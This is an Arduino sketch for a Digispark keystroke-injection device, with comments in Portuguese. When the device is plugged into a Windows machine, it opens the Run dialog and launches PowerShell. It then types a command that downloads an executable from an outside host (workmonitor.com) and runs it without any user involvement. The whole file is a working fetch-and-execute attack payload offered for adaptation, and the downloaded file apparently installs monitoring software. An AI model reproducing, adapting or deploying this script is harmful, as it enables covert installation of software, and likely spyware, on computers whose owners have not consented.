#define kbd_pt_br
#include "DigiKeyboard.h"

void setup() {
  // Código de configuração vazio
}

void loop() {
  // Envia uma tecla "Shift + R" para abrir o menu de execução (Windows + R)
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Digita "powershell" na caixa de execução e pressiona Enter
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Envia o comando para baixar e executar um arquivo, mas aqui você pode modificar para o seu uso
  DigiKeyboard.print("Start-BitsTransfer -Source \"http://workmonitor.com/install/install.exe\" -Destination \"C:\\Users\\$($env:USERNAME)\\Downloads\\spa-install.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);

  // Executa o arquivo baixado
  DigiKeyboard.print(".\\Downloads\\spa-install.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Laço infinito para não continuar o loop
  for(;;){
    // Loop vazio
  }
}